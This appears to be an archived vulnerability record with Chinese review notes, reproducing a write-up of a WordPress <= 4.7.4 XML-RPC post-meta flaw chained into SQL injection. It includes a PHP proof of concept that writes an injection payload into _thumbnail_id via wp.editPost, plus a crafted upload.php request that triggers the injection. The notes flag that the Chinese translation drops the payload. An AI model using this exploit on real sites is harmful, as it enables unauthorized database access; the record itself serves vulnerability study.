---
source: "hatch 补库批 20260928"
product: "WordPress core / optional WordPress Importer"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Wordpress <= 4.7.4 XML-RPC API POST META 未校验漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：author-level with own media and nonce; XMLRPC<=4.7.4 route or importer with separately required import permissions; downstream vulnerable SQL formatter"
side_effects: "未执行；本文需注意的操作影响：XMLRPC写元数据与SQL格式串是两个链环；importer任意WP版本说法只涉及替代写入口，不表示所有版本都存在SQLi"
source_status: "unknown"
id: "vw-24f0e5ce934585d46902528d"
entity_id: "ve-24f0e5ce934585d46902528d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：author-level with own media and nonce; XMLRPC&lt;=4.7.4 route or importer with separately required import permissions; downstream vulnerable SQL formatter

- **结论使用边界（1）**：中文PoC_thumbnail_id写xxx，而英文实际写5 %1$%s hello，翻译丢失关键载荷。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（2）**：中文称通过_wpnonce参数注入错误，真实触发是media\[\]及存储缩略图元值，nonce是防CSRF令牌。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **事实待核（3）**：XMLRPC写元数据与SQL格式串是两个链环；importer任意WP版本说法只涉及替代写入口，不表示所有版本都存在SQLi。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（4）**：英文完整保留限制与来源，可作为主文；需要区分import能力通常比作者权限高。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（5）**：末尾一query足以取关键DB值是推论，无完整数据提取验证。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Wordpress \<= 4.7.4 XML-RPC API POST META 未校验漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 中文版

以作者身份登录到您的wordpress

上传图片

记住图像/媒体的ID

创建帖子并将图像设置为特色图像（这将创建\_thumbnail\_id帖子元）

记住帖子ID

我们可以通过修改\_thumbnail\_id的值来编辑的值（6是帖子ID，5是图片/帖子ID）

### poc

    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"xxx"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);

通过这段代码，我们在数据库中添加以下负载

    5 %1$%s hello

执行SQL负载

使用作者帐户登录管理面板，转到媒体，例如

    http://0-sec.org/wp-admin/upload.php

通过\_wpnonce参数可以直接进行sql注入

    http://0-sec.org/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello

其中5 %1\$%s
hello的encode编码是5%20%251%24%25s%20hello这个请求将导致数据库执行以下查询（会有错误）

    SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'

这证明了Wordpress中的sql漏洞，正如5%1\$%s之后的前一个post值中提到的，hello就是我们的payload

### 英文原文

In order to understand the writing here, you need to read the previous
explanation <https://medium.com/websec/wordpress-sqli-bbb2afcc8e94>. If
you got it, then we can jump to the part and solve the question e.g. how
to update / insert our sql payload into \_thumbnail\_id post meta.

#### PoC start

-   Login to your wordpress as author

-   Upload image

-   Remember ID of the image / media

-   Create post and set image as featured image (this creates
    \_thumbnail\_id post meta)

-   Remember the post ID

#### Wordpress ≤ 4.7.4 XML-RPC

n case of appropriate wordpress version then we can use the third
vulnerability in this versions of wordpress
<https://wordpress.org/news/2017/05/wordpress-4-7-5/> e.g.

    Lack of capability checks for post meta data in the XML-RPC API.

This means that we can edit the value of \_thumbnail\_id with the
following code ( 6 is the post ID and 5 is image/post ID )

    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"5 %1$%s hello"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);

and with this code we add the following payload in the DB 5 %1\$%s hello

#### Wordpress importer plugin --- any version of wordpress

This is another approach for changing the \_thumbnail\_id value in the
database. If wordpress instance have enabled this plugin on it, then
simple export, change meta value and import will do the job.

#### Execute the SQL payload

Login to the administration panel with your author account, go to media
e.g. <http://local.target/wp-admin/upload.php> , grab the \_wpnonce
value and we are ready to prove our SQLi vulnerability. Issue the
following request towards your local instance:

    local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello

where 5%20%251%24%25s%20hello is url encoded 5 %1\$%s hello. This
request will result with execution of the following query against the DB
(will rise error of course):

    SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id' AND meta_value = '5 _thumbnail_id' hello'

This proves the SQLi vulnerability in the wordpress and as mention in
previous post value after 5 %1\$%s e.g. hello is our payload

#### Is this vulnerability dangerous?

SQL injection itself is quite dangerous vulnerability, but sometimes
have its own limitations. Here at our case depending of the database
server configuration or mysql client used on PHP side could be fatal,
but in our case best case scenario would be blind sql injection. Sure,
we all know the trivial attack vector, but here we have 2 facts that go
against wordpress:

meta value database column type e.g. size constraint

media parameter could be POST parameter e.g. will have huge size

This two facts guide us to the conclusion that even with blind sqli one
query would be enough to calculate some crucial DB cell value.
